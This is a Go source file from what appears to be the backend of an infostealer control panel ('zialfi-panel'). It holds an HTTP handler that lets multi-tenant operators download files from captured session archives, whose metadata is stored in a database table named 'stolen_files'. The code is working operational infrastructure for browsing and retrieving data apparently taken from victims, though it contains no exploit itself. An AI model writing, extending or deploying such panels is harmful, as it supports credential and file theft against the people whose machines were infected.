package api

import (
	"archive/zip"
	"database/sql"
	"io"
	"net/http"
	"os"
	"path/filepath"
	"strconv"
	"strings"

	"github.com/go-chi/chi/v5"
	"zialfi-panel/internal/db"
)

// FilesHandler serves files captured from a session's archive. The raw ZIP
// is stored at data/sessions/<session_id>.zip by LogProcessor; only the
// file's metadata (name, size) lives in the DB. Tenant-scoped: non-admins
// only access their own sessions (404, not 403, to avoid leaking existence).
type FilesHandler struct {
	db *sql.DB
}

func NewFilesHandler(d *sql.DB) *FilesHandler {
	return &FilesHandler{db: d}
}

// Download serves GET /api/sessions/{id}/files/{fid}/download.
func (h *FilesHandler) Download(w http.ResponseWriter, r *http.Request) {
	sessionID := chi.URLParam(r, "id")
	fileID := chi.URLParam(r, "fid")
	if sessionID == "" || fileID == "" {
		writeError(w, http.StatusBadRequest, "missing id")
		return
	}

	if !sessionOwnedBy(h.db, r, sessionID) {
		http.NotFound(w, r)
		return
	}

	var filename string
	var size int64
	err := db.QueryRow(h.db, "SELECT filename, size FROM stolen_files WHERE id = ? AND session_id = ?", fileID, sessionID).Scan(&filename, &size)
	if err == sql.ErrNoRows {
		http.NotFound(w, r)
		return
	}
	if err != nil {
		writeError(w, http.StatusInternalServerError, "lookup failed")
		return
	}

	// Locate the session archive on disk.
	absRoot, err := filepath.Abs(filepath.Join("data", "sessions"))
	if err != nil {
		writeError(w, http.StatusInternalServerError, "path resolution failed")
		return
	}
	abs := filepath.Join(absRoot, sessionID+".zip")
	if !strings.HasPrefix(abs, absRoot+string(os.PathSeparator)) {
		http.NotFound(w, r)
		return
	}

	zr, err := zip.OpenReader(abs)
	if err != nil {
		http.Error(w, "session archive missing on disk", http.StatusGone)
		return
	}
	defer zr.Close()

	// Match by base name (archives use flat filenames; the DB stores the
	// base name too). Guard against path traversal inside the archive.
	for _, f := range zr.File {
		if strings.Contains(f.Name, "..") || strings.HasPrefix(f.Name, "/") {
			continue
		}
		if filepath.Base(f.Name) == filename {
			rc, err := f.Open()
			if err != nil {
				continue
			}
			defer rc.Close()
			w.Header().Set("Content-Type", "application/octet-stream")
			w.Header().Set("Content-Disposition", `attachment; filename="`+sanitizeFilename(filename)+`"`)
			w.Header().Set("Content-Length", strconv.FormatInt(int64(f.UncompressedSize64), 10))
			io.Copy(w, rc)
			return
		}
	}

	http.NotFound(w, r)
}

// sanitizeFilename strips anything that could break the Content-Disposition
// header (quotes, CR/LF) — the value is attacker-controlled via the archive.
func sanitizeFilename(name string) string {
	name = strings.TrimSpace(name)
	name = strings.ReplaceAll(name, `"`, "")
	name = strings.ReplaceAll(name, "\r", "")
	name = strings.ReplaceAll(name, "\n", "")
	if name == "" {
		return "file"
	}
	return name
}
